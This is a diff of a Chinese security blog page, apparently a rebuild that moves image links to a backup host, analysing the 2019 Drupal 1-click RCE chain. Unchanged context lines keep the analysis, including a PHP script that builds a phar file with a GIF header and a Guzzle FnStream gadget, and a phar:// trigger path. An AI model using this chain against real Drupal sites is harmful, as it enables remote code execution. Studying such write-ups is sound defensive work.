@@ -26,22 +26,22 @@
 <meta property="og:url" content="https://lorexxar.cn/2019/04/19/drupal-1-click-rce/index.html">
 <meta property="og:site_name" content="LoRexxar&#39;s Blog">
 <meta property="og:description" content="2019年4月11日，zdi博客公开了一篇A SERIES OF UNFORTUNATE IMAGES: DRUPAL 1-CLICK TO RCE EXPLOIT CHAIN DETAILED. 整个漏洞的各个部分没什么特别的，巧妙的是，攻击者使用了3个漏洞+几个小trick，把所有的漏洞链接起来却成了一个还不错的利用链，现在我们就来一起看看整个漏洞.">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/indn6qfpopamyrayhdcce9la/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/s5oij4hcmjf0k2z0e0glftfy/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/64be2k19ac5nknfenv5ze9d2/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/02tpqziep6h2sq4oerq5nel9/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/7bprh31be2igfao2ozo7gkia/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/4j71xgb53o74nwfue1fp2y01/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/105tpluq69zpoggbzcj879hc/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/indn6qfpopamyrayhdcce9la/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/s5oij4hcmjf0k2z0e0glftfy/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/64be2k19ac5nknfenv5ze9d2/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/02tpqziep6h2sq4oerq5nel9/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/7bprh31be2igfao2ozo7gkia/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4j71xgb53o74nwfue1fp2y01/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/105tpluq69zpoggbzcj879hc/image.png">
 <meta property="article:published_time" content="2019-04-19T11:13:56.000Z">
-<meta property="article:modified_time" content="2019-04-22T02:26:44.000Z">
+<meta property="article:modified_time" content="2020-09-29T06:11:23.914Z">
 <meta property="article:author" content="LoRexxar">
 <meta property="article:tag" content="xss">
 <meta property="article:tag" content="phar">
 <meta property="article:tag" content="rce">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://static.zybuluo.com/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png">
+<meta name="twitter:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -458,10 +458,10 @@ height:50vh;
 
 <h1 id="无后缀文件写入"><a href="#无后缀文件写入" class="headerlink" title="无后缀文件写入"></a>无后缀文件写入</h1><p>在Drupal的机制中，设定了这样一条规则。</p>
 <p>用户上传的图片文件名将会被保留，如果出现文件名相同的情况，那么文件名后面就会被跟上<code>_0</code>,<code>_1</code>依次递增。</p>
-<p>在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，如果出现值小于<code>0x20</code>的字符，那么就会将其转化为<code>_</code>。<br><img src="http://static.zybuluo.com/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png" alt="image.png-130.8kB"></p>
+<p>在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，如果出现值小于<code>0x20</code>的字符，那么就会将其转化为<code>_</code>。<br><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png" alt="image.png-130.8kB"></p>
 <p>但如果文件名中，如果出现了<code>\x80</code>到<code>\xff</code>的字符时，PHP就会抛出<code>PREG_BAD_UTF8_ERROR</code>，如果发生错误，那么<code>preg_replace</code>就会返回NULL，<code>$basename</code>就会被置为NULL。</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/indn6qfpopamyrayhdcce9la/image.png" alt="image.png-25.4kB"></p>
-<p>当basename为空时，后面的文件内容会被写入到形似<code>_0</code>的文件内<br><img src="http://static.zybuluo.com/LoRexxar/s5oij4hcmjf0k2z0e0glftfy/image.png" alt="image.png-297.1kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/indn6qfpopamyrayhdcce9la/image.png" alt="image.png-25.4kB"></p>
+<p>当basename为空时，后面的文件内容会被写入到形似<code>_0</code>的文件内<br><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/s5oij4hcmjf0k2z0e0glftfy/image.png" alt="image.png-297.1kB"></p>
 <p>在这个基础下，原本会被上传到</p>
 <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/sites/</span><span class="keyword">default</span><span class="regexp">/files/</span>pictures<span class="regexp">/&lt;YYYY-MM&gt;/</span></span><br></pre></td></tr></table></figure>
 
@@ -470,7 +470,7 @@ height:50vh;
 
 <p><strong>当服务端开启了评论头像上传，或者是拥有作者账号时</strong></p>
 <p>攻击者可以通过上传一张恶意构造的gif图，然后再上传一张带有恶意字符的同一张图，那么就会将恶意图片的内容写入到相应目录的<code>_0</code>中</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/64be2k19ac5nknfenv5ze9d2/image.png" alt="image.png-214.9kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/64be2k19ac5nknfenv5ze9d2/image.png" alt="image.png-214.9kB"></p>
 <p>但如果我们直接访问这个文件时，该文件可能不会解析，这是因为<br>1、浏览器首先会根据服务端给出的content-type解析页面，而服务端一般不会给空后缀的文件设置<code>content-type</code>，或者设置为<code>application/octet-stream</code><br>2、其次浏览器会根据文件内容做简单的判断，如果文件的开头为<code>&lt;html&gt;</code>，则部分浏览器会将其解析为html<br>3、部分浏览器还可能会设置默认的content-type，但大部分浏览器会选择不解析该文件。</p>
 <p>这时候我们就需要一个很特殊的小trick了，<strong>a标签可以设置打开文件的type(only not for chrome)</strong></p>
 <p>当你访问该页面时，页面会被解析为html并执行相应的代码。</p>
@@ -482,15 +482,15 @@ height:50vh;
 <p>在我们知道创宇404实验室安全研究员seaii曾经的研究(<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)中表示，所有的文件函数都支持stream wrapper。</p>
 <p>也就是说，如果我们找到可控的文件操作函数，其参数可控为phar文件，那么我们就可以通过反序列化执行js。</p>
 <p>在Drupal中，存在file system功能，其中就有一个功能，会把传入的地址做一次<code>is_dir</code>的判断，这里就存在这个问题</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/02tpqziep6h2sq4oerq5nel9/image.png" alt="image.png-337kB"></p>
-<p><img src="http://static.zybuluo.com/LoRexxar/7bprh31be2igfao2ozo7gkia/image.png" alt="image.png-82.8kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/02tpqziep6h2sq4oerq5nel9/image.png" alt="image.png-337kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/7bprh31be2igfao2ozo7gkia/image.png" alt="image.png-82.8kB"></p>
 <p>直接使用下面的payload生成文件</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">FnStream</span></span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $_fn_close = <span class="string">"phpinfo"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_fn_close)) &#123;</span></span><br><span class="line"><span class="php">                call_user_func(<span class="keyword">$this</span>-&gt;_fn_close);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span>&#123;</span></span><br><span class="line"><span class="php">    @unlink(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> \GuzzleHttp\Psr7\FnStream();</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    <span class="comment">//签名自动计算</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 <p>修改后缀为png之后，传图片到服务端，并在<code>file system</code>中设置</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:<span class="regexp">//</span>.<span class="regexp">/sites/</span>default<span class="regexp">/files/</span><span class="number">2019</span>-<span class="number">04</span><span class="regexp">/drupal.png</span></span><br></pre></td></tr></table></figure>
 
 <p>即可触发</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/4j71xgb53o74nwfue1fp2y01/image.png" alt="image.png-215kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4j71xgb53o74nwfue1fp2y01/image.png" alt="image.png-215kB"></p>
 <h1 id="漏洞要求"><a href="#漏洞要求" class="headerlink" title="漏洞要求"></a>漏洞要求</h1><p>这个漏洞在Drual8.6.6的更新中被修复，所以漏洞要求为</p>
 <ul>
 <li>&lt;= Durpal 8.6.6</li>
@@ -499,7 +499,7 @@ height:50vh;
 </ul>
 <p>当上面三点同时成立时，这个攻击链就可以被成立</p>
 <h1 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h1><h2 id="无后缀文件写入-SA-CORE-2019-004"><a href="#无后缀文件写入-SA-CORE-2019-004" class="headerlink" title="无后缀文件写入 SA-CORE-2019-004"></a>无后缀文件写入 SA-CORE-2019-004</h2><p><a href="https://www.drupal.org/SA-CORE-2019-004" target="_blank" rel="noopener">https://www.drupal.org/SA-CORE-2019-004</a></p>
-<p><img src="http://static.zybuluo.com/LoRexxar/105tpluq69zpoggbzcj879hc/image.png" alt="image.png-40.6kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/105tpluq69zpoggbzcj879hc/image.png" alt="image.png-40.6kB"></p>
 <p>如果出现该错误直接抛出，不继续写入</p>
 <p><a href="https://github.com/drupal/drupal/commit/82307e02cf974d48335e723c93dfe343894e1a61#diff-5c54acb01b2253384cfbebdc696a60e7" target="_blank" rel="noopener">https://github.com/drupal/drupal/commit/82307e02cf974d48335e723c93dfe343894e1a61#diff-5c54acb01b2253384cfbebdc696a60e7</a></p>
 <h2 id="phar反序列化-SA-CORE-2019-002"><a href="#phar反序列化-SA-CORE-2019-002" class="headerlink" title="phar反序列化  SA-CORE-2019-002"></a>phar反序列化  SA-CORE-2019-002</h2><p><a href="https://www.drupal.org/SA-CORE-2019-002" target="_blank" rel="noopener">https://www.drupal.org/SA-CORE-2019-002</a></p>
@@ -512,7 +512,7 @@ height:50vh;
             <p>原文作者：<a href="https://lorexxar.cn">LoRexxar</a>
             <p>原文链接：<a href="https://lorexxar.cn/2019/04/19/drupal-1-click-rce/">https://lorexxar.cn/2019/04/19/drupal-1-click-rce/</a>
             <p>发表日期：<a href="https://lorexxar.cn/2019/04/19/drupal-1-click-rce/">April 19th 2019, 7:13:56 pm</a>
-            <p>更新日期：<a href="https://lorexxar.cn/2019/04/19/drupal-1-click-rce/">April 22nd 2019, 10:26:44 am</a>
+            <p>更新日期：<a href="https://lorexxar.cn/2019/04/19/drupal-1-click-rce/">September 29th 2020, 2:11:23 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
